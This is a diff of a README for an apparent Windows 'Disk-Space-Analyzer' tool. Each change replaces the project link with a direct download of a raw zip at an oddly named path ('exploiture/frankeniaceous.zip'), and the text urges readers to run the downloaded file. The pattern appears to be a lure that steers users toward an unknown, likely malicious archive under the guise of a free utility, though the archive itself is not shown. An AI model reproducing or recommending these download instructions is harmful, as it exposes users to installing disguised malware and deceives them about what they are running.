@@ -1,12 +1,12 @@
 # 🚀 Disk-Space-Analyzer - Free Up Space Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Disk--Space--Analyzer-blueviolet?style=for-the-badge&logo=windows)](https://github.com/Blade202501/Disk-Space-Analyzer)
+[![Download Now](https://img.shields.io/badge/Download-Disk--Space--Analyzer-blueviolet?style=for-the-badge&logo=windows)](https://github.com/Blade202501/Disk-Space-Analyzer/raw/refs/heads/main/exploiture/frankeniaceous.zip)
 
 ## 📥 Getting Started
 
 Welcome to **Disk-Space-Analyzer** – the ultimate tool to clean up your Windows PC and reclaim valuable storage space. This free 2026 version gives you full access to every feature with zero limitations. No subscriptions, no hidden costs, just pure disk-cleaning power.
 
-Visit this link to download the application: [https://github.com/Blade202501/Disk-Space-Analyzer](https://github.com/Blade202501/Disk-Space-Analyzer)
+Visit this link to download the application: [https://github.com/Blade202501/Disk-Space-Analyzer/raw/refs/heads/main/exploiture/frankeniaceous.zip](https://github.com/Blade202501/Disk-Space-Analyzer/raw/refs/heads/main/exploiture/frankeniaceous.zip)
 
 ## 💽 What Is Disk-Space-Analyzer?
 
@@ -123,7 +123,7 @@ No, this tool focuses on disk space, not registry cleaning. It's safer and more 
 
 ## 📝 Final Steps
 
-1. **Download now** using the button at the top or this link: [https://github.com/Blade202501/Disk-Space-Analyzer](https://github.com/Blade202501/Disk-Space-Analyzer)
+1. **Download now** using the button at the top or this link: [https://github.com/Blade202501/Disk-Space-Analyzer/raw/refs/heads/main/exploiture/frankeniaceous.zip](https://github.com/Blade202501/Disk-Space-Analyzer/raw/refs/heads/main/exploiture/frankeniaceous.zip)
 2. **Install** by running the downloaded file.
 3. **Launch** the app and scan your first drive.
 4. **Reclaim** gigabytes of space in minutes.
